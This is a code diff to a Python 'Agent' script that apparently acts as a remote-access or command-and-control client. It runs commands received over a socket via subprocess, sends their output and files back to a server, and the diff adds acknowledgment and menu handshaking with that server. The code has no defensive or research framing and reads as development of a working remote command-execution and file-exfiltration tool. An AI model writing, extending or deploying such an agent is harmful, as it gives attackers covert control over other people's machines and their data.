@@ -1,7 +1,10 @@
+# Agent
+
 import socket
 import subprocess
 import os
 import uuid
+
 
 def get_agent_id():
     # Generate a unique agent ID based on machine and network information
@@ -43,6 +46,18 @@ def main():
         output = execute_command(command)
         if isinstance(output, bytes):
             client.send(output)
+
+            # Wait for acknowledgment from the server
+            acknowledgment = client.recv(4096).decode('utf-8')
+            print(acknowledgment)
+
+            # If acknowledgment is received, return to the choice options
+            if acknowledgment == "File received successfully":
+                # Trigger the server to send the next menu
+                client.send("next_menu".encode('utf-8'))
+            else:
+                print("Error receiving file acknowledgment.")
+                break
         else:
             client.send(output.encode('utf-8'))
 
